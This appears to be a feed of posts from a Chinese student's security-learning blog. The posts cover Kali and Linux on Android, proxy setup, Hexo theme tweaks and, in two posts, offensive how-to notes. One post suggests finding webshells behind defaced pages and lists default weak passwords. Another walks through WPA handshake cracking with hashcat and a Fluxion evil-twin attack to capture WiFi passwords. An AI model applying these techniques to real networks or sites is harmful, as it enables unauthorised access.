        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1903.jpg" alt=""></p><a id="more"></a><h1 id="一九年三月总结"><a href="#一九年三月总结" class="headerlink" title="一九年三月总结"></a>一九年三月总结</h1><h2 id="渗透学习"><a href="#渗透学习" class="headerlink" title="渗透学习"></a>渗透学习</h2><p>1.通过已有黑页后面找马，尝试使用弱口令登陆</p><blockquote><p>intext：请于用于非法用途，后果作者概不负责！</p></blockquote><p>2.学习文章，多见识已有思想。</p><p>secwiki:<a href="https://www.sec-wiki.com" target="_blank" rel="noopener">SecWiki官网</a></p><p>先知社区:<a href="https://xz.aliyun.com/" target="_blank" rel="noopener">链接</a></p><p>3.常用弱口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">administrator:password</span><br><span class="line">admin:12345</span><br><span class="line">root:secret</span><br><span class="line">guest:guest</span><br><span class="line">root:toor</span><br></pre></td></tr></table></figure><h2 id="常看文章"><a href="#常看文章" class="headerlink" title="常看文章"></a>常看文章</h2><p>25端口渗透：<a href="https://www.sqlsec.com/2017/08/smtp.html" target="_blank" rel="noopener">国光</a>可伪造邮件进行钓鱼等</p><p>iis短文件名泄露:<a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">github的代码</a>感觉危害不大，没利用过</p><p>thinkphp 5.0漏洞:<a href="https://www.jianshu.com/p/46ceb2c338bc?appinstall=0&amp;from=groupmessage" target="_blank" rel="noopener">命令执行漏洞</a>好好利用可getshell</p><h2 id="推荐阅读博客"><a href="#推荐阅读博客" class="headerlink" title="推荐阅读博客"></a>推荐阅读博客</h2><p><a href="https://www.cnblogs.com/someone9/" target="_blank" rel="noopener">hof的博客</a></p><p><a href="https://lfforu.com" target="_blank" rel="noopener">Allesa学姐的博客</a></p><p><a href="https://www.cnblogs.com/yakoazz" target="_blank" rel="noopener">老潘的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搬迁</title>
      <link href="/hexo%E6%90%AC%E8%BF%81/"/>
      <url>/hexo%E6%90%AC%E8%BF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>之前的博客是在<code>kali</code>上搭建的,开学了旧电脑懒得带自能搬家博客了。</p><p>系统：<code>win10</code></p><p>博客安装环境：<code>nodejs、hexo</code> 之前参看本专业大神的博客试着搭建过，后来没成功，但是环境没卸载。当时的<a href="https://orangice.gitee.io/2017/03/18/hexo00/" target="_blank" rel="noopener">参考文章</a></p><h1 id="搬迁"><a href="#搬迁" class="headerlink" title="搬迁"></a>搬迁</h1><p>网上有通过github的方式进行搬迁，我嫌太麻烦了，就直接从kali上把博客的文件夹拷贝了。<br>1.<code>d盘</code>创建myBlog文件夹<br>2.将文件解压到文件夹下</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>暂时就gulp不能正常使用<br>解决办法：<code>npm install -g gulp</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>先凑合着用，以后发现有什么需要改进的地方再解决</p><hr><p>更新： 2019/2/25</p><h1 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h1><h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>Typora是一个markdown编辑器，之前一直是用admin插件在写文章，听说这款软件不错，于是想试试。</p><p>下载地址:<a href="https://www.typora.io/" target="_blank" rel="noopener">官网</a></p><h2 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h2><p>PicGo是一个快捷的图片部署工具</p><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p><a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">项目地址</a><a href="https://picgo.github.io/PicGo-Doc/zh/" target="_blank" rel="noopener">帮助文档</a></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>PicGo支持Github图床，我是参考这篇<a href="https://www.jianshu.com/p/87ea6603a824" target="_blank" rel="noopener">文章</a>来进行的配置</p><h4 id="登陆GitHub"><a href="#登陆GitHub" class="headerlink" title="登陆GitHub"></a>登陆GitHub</h4><h4 id="新建repo-命名为img"><a href="#新建repo-命名为img" class="headerlink" title="新建repo, 命名为img"></a>新建repo, 命名为img</h4><h4 id="设置好token"><a href="#设置好token" class="headerlink" title="设置好token"></a>设置好token</h4><ul><li>访问：<a href="https://github.com/settings/tokens" target="_blank" rel="noopener">https://github.com/settings/tokens</a></li><li><p>选择<code>generate new token</code></p></li><li><p>打勾<code>repo</code></p></li><li><p>选择<code>generate token</code></p></li></ul><p><strong>注意</strong>：这个token生成后只会显示一次！</p><h4 id="在PicGo页面根据提示进行填写"><a href="#在PicGo页面根据提示进行填写" class="headerlink" title="在PicGo页面根据提示进行填写"></a>在PicGo页面根据提示进行填写</h4><h3 id="imagine"><a href="#imagine" class="headerlink" title="imagine"></a>imagine</h3><p>图片压缩工具，下载：<a href="https://github.com/meowtec/Imagine/releases" target="_blank" rel="noopener">项目地址</a></p><h3 id="软件样式"><a href="#软件样式" class="headerlink" title="软件样式"></a>软件样式</h3><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/0.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali 科学上网</title>
      <link href="/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="kali-科学上网"><a href="#kali-科学上网" class="headerlink" title="kali 科学上网"></a>kali 科学上网</h1><p>32位的kali貌似没有图形化操作界面的科学上网软件，于是只好使用命令行操作了。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>终端输入：</p><blockquote><p>sudo apt install shadowsocks</p></blockquote><h3 id="编辑帐号密码"><a href="#编辑帐号密码" class="headerlink" title="编辑帐号密码"></a>编辑帐号密码</h3><p>终端输入：</p><blockquote><p>vi /etc/shadowsocks.json</p></blockquote><p>在配置文件中按照下面的格式填写配置信息，也就帐号密码之类的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  &quot;server&quot;:&quot;服务器地址&quot;, </span><br><span class="line">  &quot;server_port&quot;:服务器端口号, </span><br><span class="line">  &quot;local_address&quot;: &quot;127.0.0.1&quot;, </span><br><span class="line">  &quot;local_port&quot;:1080, </span><br><span class="line">  &quot;password&quot;:&quot;密码&quot;, </span><br><span class="line">  &quot;timeout&quot;:300, </span><br><span class="line">  &quot;method&quot;:&quot;加密方式&quot;, </span><br><span class="line">  &quot;fast_open&quot;: true, </span><br><span class="line">  &quot;workers&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置proxychains"><a href="#设置proxychains" class="headerlink" title="设置proxychains"></a>设置proxychains</h3><h4 id="打开配置文件"><a href="#打开配置文件" class="headerlink" title="打开配置文件"></a>打开配置文件</h4><blockquote><p>vi /etc/proxychains.conf</p></blockquote><p>1.去掉dynamic_chain前面的注释符</p><p>2.在最下方，默认是sock4 xxxx xxx改为sock5 127.0.0.1 xxxx （xxxx是自己刚才设定的端口号，也就是上边配置ss时输入的local_port:xxxx）</p><p>根据上面的设置此处就应该该为sock5 127.0.0.1:1080</p><h4 id="测试代理是否正常"><a href="#测试代理是否正常" class="headerlink" title="测试代理是否正常"></a>测试代理是否正常</h4><blockquote><p>proxyresolv <a href="http://www.target.com" target="_blank" rel="noopener">www.target.com</a></p></blockquote><p>如果出现命令未找到，终端执行</p><blockquote><p>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</p></blockquote><p>正常情况是没有开代理返回<strong><em>timeout</em></strong></p><h2 id="开启代理"><a href="#开启代理" class="headerlink" title="开启代理"></a>开启代理</h2><p>开启代理</p><blockquote><p>sslocal -c /etc/shadowsocks.json -d start</p></blockquote><p>转发启动软件</p><blockquote><p>火狐：proxychains firefox</p></blockquote><p>不用了就关闭代理</p><blockquote><p>sslocal -c /etc/shadowsocks.json -d stop</p></blockquote><ul><li>整个安装使用过程比较顺利，这可能和之前使用了ss的一些依赖环境有关</li><li>需要关闭火狐再使用转发启动软件</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WiFi小结</title>
      <link href="/WiFi%E7%A0%B4%E8%A7%A3%E5%B0%8F%E7%BB%93/"/>
      <url>/WiFi%E7%A0%B4%E8%A7%A3%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="学习小结"><a href="#学习小结" class="headerlink" title="学习小结"></a><em>学习小结</em></h1><ul><li>免责声明:以下内容仅供学习参考</li></ul><h1 id="跑包"><a href="#跑包" class="headerlink" title="跑包"></a>跑包</h1><h2 id="GUP跑包"><a href="#GUP跑包" class="headerlink" title="GUP跑包"></a>GUP跑包</h2><h3 id="转换格式"><a href="#转换格式" class="headerlink" title="转换格式"></a>转换格式</h3><p>使用<code>hashcat</code>密码破解,首先使用工具将cap转换成hccapx<br>方法一：<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">在线转换网站</a><br>方法二：下载工具<br>工具下载：<a href="https://github.com/hashcat/hashcat-utils/tree/master" target="_blank" rel="noopener">下载</a><br>下载完成后进入src目录编译cap2hccapx.c</p><blockquote><p>gcc cap2hccapx.c -o cap2hccapx</p></blockquote><p>转换文件</p><blockquote><p>./cap2hccapx input.pcap output.hccapx</p></blockquote><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>方法一：使用<code>naive-hashcat</code>解密，我的垃圾电脑跑不了，这个只是了解参考。<a href="https://github.com/brannondorsey/naive-hashcat" target="_blank" rel="noopener">项目地址</a></p><p>方法二:在线解密</p><p><a href="https://gpuhash.me" target="_blank" rel="noopener">这个需要支付BTC</a>:穷，玩不起，没使用</p><p><a href="https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php" target="_blank" rel="noopener">这个可以免费跑2千万个密码</a>:结果会发送到填写的邮箱</p><h1 id="欺骗用户"><a href="#欺骗用户" class="headerlink" title="欺骗用户"></a>欺骗用户</h1><h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>一台PC–<code>kali</code>系统</p><p>一个usb无线网卡–<code>RT3070</code></p><p>两台手机–一台<code>开热点</code>一台模拟<code>合法用户</code></p><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>下载最新版本</p><blockquote><p>git clone <a href="https://github.com/FluxionNetwork/fluxion.git" target="_blank" rel="noopener">https://github.com/FluxionNetwork/fluxion.git</a></p></blockquote><p>我使用的是3.10版本的，在<a href="https://github.com/FluxionNetwork/fluxion" target="_blank" rel="noopener">项目地址</a>自行下载</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><blockquote><p>cd fluxion</p></blockquote><blockquote><p>sudo ./fluxion.sh</p></blockquote><p>按照提示进行使用，可参考[sevge博客]的fluxion一文，其实在项目的网站说明了需要使用<code>外置的usb网卡</code>我一开始是使用的内置无线网卡，使用程序一直<strong>卡在创建AP</strong>处。后来请教sevge大佬，解决了这个问题</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>我使用的V3.10存在不管密码是否正确，程序都会结束wifi干扰</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>获得正确的密码<br><img src="https://s2.ax1x.com/2019/02/16/ksELZt.png" alt="ksELZt.png"></p><h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>使用路由器mac地址来定位地址，<a href="https://www.opengps.cn/Data/WIFI/Search.aspx" target="_blank" rel="noopener">查询网站</a>。测试效果精确</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/brannondorsey/wifi-cracking" target="_blank" rel="noopener">Wifi小结-github</a></p><p><a href="http://www.jianshu.com/p/ce2433d0a0d3" target="_blank" rel="noopener">关于定位的文章</a></p><p><a href="https://www.jianshu.com/p/04e258635466?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">fluxion使用文章</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓手机安装kali(2)</title>
      <link href="/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali-2/"/>
      <url>/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali-2/</url>
      
        <content type="html"><![CDATA[<h1 id="使用VNC"><a href="#使用VNC" class="headerlink" title="使用VNC"></a><strong><em>使用VNC</em></strong></h1><p>前面已经安装好了kali，接下来是看看图形化界面了。</p><h1 id="安卓手机"><a href="#安卓手机" class="headerlink" title="安卓手机"></a>安卓手机</h1><p>由于我的安卓版本比较低，使用不了网上博文中提供VNC viewer,安卓4.4+使用的<a href="https://www.realvnc.com/en/connect/download/viewer/android/" target="_blank" rel="noopener">VNC viewer</a>,该地址还提供其他系统的版本<br>我的垃圾手机是没有这个福利了，只好找其他替代软件了，经过几番查找找到了一个<a href="https://android-vnc-viewer.en.softonic.com/android/download" target="_blank" rel="noopener">140多k的软件</a></p><h1 id="kali电脑"><a href="#kali电脑" class="headerlink" title="kali电脑"></a>kali电脑</h1><p>下载VNC viewer</p><blockquote><p>apt-get install tigervnc-viewer </p></blockquote><p>运行</p><blockquote><p>viewer</p></blockquote><h1 id="安装中文库"><a href="#安装中文库" class="headerlink" title="安装中文库"></a>安装中文库</h1><p>使用ssh连接手机后root执行下面的命令</p><blockquote><p>apt-get install xfonts-intl-chinese</p></blockquote><blockquote><p>apt-get install ttf-wqy-microhei</p></blockquote><h1 id="启动VNC服务端"><a href="#启动VNC服务端" class="headerlink" title="启动VNC服务端"></a>启动VNC服务端</h1><p>执行命令</p><blockquote><p>vncserver</p></blockquote><p>返回结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">New &apos;X&apos; desktop is localhost:1</span><br><span class="line">Starting applications specified in /home/android/.vnc/xstartup</span><br><span class="line">Log file is /home/android/.vnc/localhost:1.log</span><br></pre></td></tr></table></figure></p><p>证明vncserver已启动成功<br>因为刚刚终端返回的信息:<strong><em>New ‘X’ desktop is localhost:1</em></strong>指定了此次桌面会话号为<strong>1</strong>，所以端口就为<strong>5900+1=5901</strong>。如果我们开启了多个虚拟桌面，它们的会话号为2,3,4…，那么各自的端口即为5902,5903,5904…依次类推。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>停止Linux系统再启动Linux系统后，再次执行vncserver命令会出现报错<br><a href="https://imgchr.com/i/kB3jHJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/14/kB3jHJ.png" alt="kB3jHJ.png"></a><br>解决办法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /tmp/.X[1-9]-lock</span><br><span class="line">rm -rf /tmp/.X11-unix/X[1-9]</span><br></pre></td></tr></table></figure></p><h2 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h2><p>vncserver默认的分辨率是1024×768<br>手机屏幕的分辨率都是720P(1280×720)，1080P(1920×1080)，甚至2K(2560×1440)<br>启动vncserver时，执行：</p><blockquote><p> vncserver -geometry 1280x720</p></blockquote><ul><li>命令中的1280x720里的x是小写字母x</li></ul><p>自动更改分辨率</p><blockquote><p>vim ~/.bashrc #编辑~/.bashrc<br>alias vncserver=’vncserver -geometry 1280x720’ </p></blockquote><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mlapp.cn/337.html" target="_blank" rel="noopener">美丽应用</a><br><a href="www.360doc.com/content/18/1123/02/40461272_796637204.shtml">安装vncserver</a></p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玩手机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓手机安装kali</title>
      <link href="/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali/"/>
      <url>/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali/</url>
      
        <content type="html"><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>安装好了前面<strong><em>ubuntu</em></strong>那篇文章中的三个软件</p><h1 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h1><p>我使用的是中科大的源</p><blockquote><p><a href="http://mirrors.ustc.edu.cn/kali/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali/</a></p></blockquote><p>源的格式</p><ul><li>中科大 - <a href="http://mirrors.ustc.edu.cn/+Linux&#39;s" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/+Linux&#39;s</a> Name/</li><li>阿里云 - <a href="http://mirrors.aliyun.com/+Linux&#39;s" target="_blank" rel="noopener">http://mirrors.aliyun.com/+Linux&#39;s</a> Name/</li></ul><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>获取管理员权限sudo出现问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo: PERM_ROOT: setresuid(0, -1, -1): 权限不够</span><br><span class="line">sudo: 无法初始化策略插件</span><br></pre></td></tr></table></figure></p><p>相关问题，参考文章-<a href="https://github.com/meefik/linuxdeploy/issues/224" target="_blank" rel="noopener">github地址</a><br>网传解决方法是把用户名设为root然后再重新配置，这个方法没有解决我的问题，还导致我不能登录设备</p><ul><li>最后我先用普通用户ssh登录，然后su，默认密码是toor。这样也能获取管理员权限<br><img src="https://s2.ax1x.com/2019/02/14/kBC7Sx.png" alt="kBC7Sx.png"></li></ul><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://www.freebuf.com/articles/terminal/13209.html" target="_blank" rel="noopener">基础文章</a><br><a href="https://blog.csdn.net/notzuonotdied/article/details/53933076" target="_blank" rel="noopener">进阶文章</a></p><blockquote><p><a href="https://mlapp.cn/134.html" target="_blank" rel="noopener">可继续学习博客</a></p></blockquote><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>之前在学校捣腾了一下午，失败告终，今日再度从0开始学习总算成功了。</p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玩手机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓手机安装ubuntu</title>
      <link href="/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85ubuntu/"/>
      <url>/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85ubuntu/</url>
      
        <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>一台安卓4.2的手机</p><blockquote><p>将手机ROOT，ROOT工具一键ROOT <a href="root.360.cn/#firstPage">ROOT工具下载</a></p></blockquote><p>一台电脑</p><h1 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h1><p>Linux系统支撑软件:<a href="https://github.com/meefik/linuxdeploy/releases" target="_blank" rel="noopener">Linux deploy</a></p><p>Linux deploy支撑软件:<a href="https://github.com/meefik/busybox/releases" target="_blank" rel="noopener">Busy Box</a></p><p>手机端SSH连接软件:<a href="https://github.com/connectbot/connectbot/releases" target="_blank" rel="noopener">ConnectBox</a></p><blockquote><p>我参考了一篇17年的安卓4.1文章，为保险起见我安装的是17年的Linux deploy</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="首先安装的是Busy-Box"><a href="#首先安装的是Busy-Box" class="headerlink" title="首先安装的是Busy Box"></a>首先安装的是Busy Box</h2><ul><li><p>Busy Box默认界面语言是英文，可以改成中文，点击右上角部分，在弹出的菜单中选择Settings，接着进入设置界面，找到Language项，点击后选择简体中文</p></li><li><p>点击安装，等待程序自行运行，在界面中输出## END后退出程序</p></li></ul><h2 id="安装运行Linux-deploy"><a href="#安装运行Linux-deploy" class="headerlink" title="安装运行Linux deploy"></a>安装运行Linux deploy</h2><ul><li>点击<strong><em>左上角</em></strong>选择设置找到PATH变量，赋予其值 /system/xbin 这里的路径是Busy Box的安装路径</li><li>先移除环境再更新环境</li><li>选择锁定WIFI 防止下载掉线</li><li>退回主界面，点击<strong><em>右下角</em></strong>部分,文中没有的为默认的，配置如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">属性:linux</span><br><span class="line">Containerization method (chroot)</span><br><span class="line">发行版（Ubuntu）</span><br><span class="line">架构（armhf）</span><br><span class="line">发行版版本（xenial）</span><br><span class="line">源地址 （http://mirrors.ustc.edu.cn/ubuntu-ports）</span><br><span class="line">安装类型（文件）</span><br><span class="line">安装路径（$&#123;ENV_DIR&#125;/linux.img）</span><br><span class="line">本地化（zh_CN.UTF-8）</span><br></pre></td></tr></table></figure><ul><li>安装路径是Linux系统的安装路径，如要安装在手机自带的存储空间中，则在路径开头加上${ENV_DIR}，这代表的是存储空间根目录。如要安装在sdcard中，则加上${EXTERNAL_STORAGE}。</li><li>用户名和密码自定义，本地、远程连接该系统用。</li></ul><blockquote><p>INIT 选择Enable</p></blockquote><blockquote><p>MOUNTS 选择Enable (挂载功能可让Linux系统访问手机上的文件<br>挂载列表中添加访问手机内容的目录，/sdcard:sdcard为手机自带存储空间根目录，/storage/sdcard1为sd卡根目录。)</p></blockquote><blockquote><p>SSH 选择Enable</p></blockquote><blockquote><p>图形界面 选择Enable (桌面环境选择Xfce)</p></blockquote><ul><li>退出系统设置界面，点击主界面右上角，选择安装。&lt;&lt;&lt;deploy则安装完毕。没有报错则安装成功。注意：安装完毕后要<strong><em>先点击停止按钮，再按启动按钮</em></strong></li></ul><h2 id="安装ConnectBot"><a href="#安装ConnectBot" class="headerlink" title="安装ConnectBot"></a>安装ConnectBot</h2><ul><li>点击右上角 +号创建 </li><li>输入用户名，主机输入localhost</li><li>点击右上角 +号保存信息，主界面会多出来添加的选项，点击进行SSH连接 </li></ul><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><strong><em>ss连接上后</em></strong><img src="https://s2.ax1x.com/2019/02/13/k0hRl6.png" alt="k0hRl6.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整个安装过程不太顺利，需要多次调试。强烈推荐中科大的源安装速度快好用得很</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/weixin_38235758/article/details/79219050" target="_blank" rel="noopener">首先参考文章</a><br><a href="https://www.linuxidc.com/Linux/2017-05/144274.htm" target="_blank" rel="noopener">图形化界面操作文章</a><br><a href="mirrors.ustc.edu.cn">中科大源</a></p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玩手机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加页面标题欺骗</title>
      <link href="/%E6%B7%BB%E5%8A%A0%E9%A1%B5%E9%9D%A2%E6%A0%87%E9%A2%98%E6%AC%BA%E9%AA%97/"/>
      <url>/%E6%B7%BB%E5%8A%A0%E9%A1%B5%E9%9D%A2%E6%A0%87%E9%A2%98%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>离开网页，标题出现一行文字<br>重新回到网页，标题又显示另一行文字</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>在next\source\js\src文件夹下创建crash_cheat.js，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--崩溃欺骗--&gt;</span><br><span class="line"> var OriginTitle = document.title;</span><br><span class="line"> var titleTime;</span><br><span class="line"> document.addEventListener(&apos;visibilitychange&apos;, function () &#123;</span><br><span class="line">     if (document.hidden) &#123;</span><br><span class="line">         $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;);</span><br><span class="line">         document.title = &apos;页面崩溃点击恢复&apos;;</span><br><span class="line">         clearTimeout(titleTime);</span><br><span class="line">     &#125;</span><br><span class="line">     else &#123;</span><br><span class="line">         $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;);</span><br><span class="line">         document.title = &apos;页面修复成功&apos; ;</span><br><span class="line">         titleTime = setTimeout(function () &#123;</span><br><span class="line">             document.title = OriginTitle;</span><br><span class="line">         &#125;, 2000);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure></p><h1 id="引用代码"><a href="#引用代码" class="headerlink" title="引用代码"></a>引用代码</h1><p>在next\layout_layout.swig文件中，添加引用（注：在/body前即可）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--崩溃欺骗--&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/crash_cheat.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/" target="_blank" rel="noopener">asdfv1929的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>next主题添加音乐播放器</title>
      <link href="/next%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90/"/>
      <url>/next%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90/</url>
      
        <content type="html"><![CDATA[<h1 id="添加APlayer播放器"><a href="#添加APlayer播放器" class="headerlink" title="添加APlayer播放器"></a>添加APlayer播放器</h1><h2 id="原由"><a href="#原由" class="headerlink" title="原由"></a>原由</h2><p>之前把播放器嵌在站点概览里，在手机端显示不了导致不能停止音乐</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/MoePlayer/APlayer" target="_blank" rel="noopener">项目地址</a>下载解压后将<strong><em>dist</em></strong>文件夹复制到themes\next\source文件夹下</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在<code>themes\next\source\dist</code>文件夹下创建music.js文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">const ap = new APlayer(&#123;</span><br><span class="line">    container: document.getElementById(&apos;aplayer&apos;),</span><br><span class="line">    fixed: true,   //吸底模式</span><br><span class="line">    autoplay: true, //自动播放</span><br><span class="line">    theme: &apos;#FADFA3&apos;, //主题色</span><br><span class="line">    loop: &apos;all&apos;, 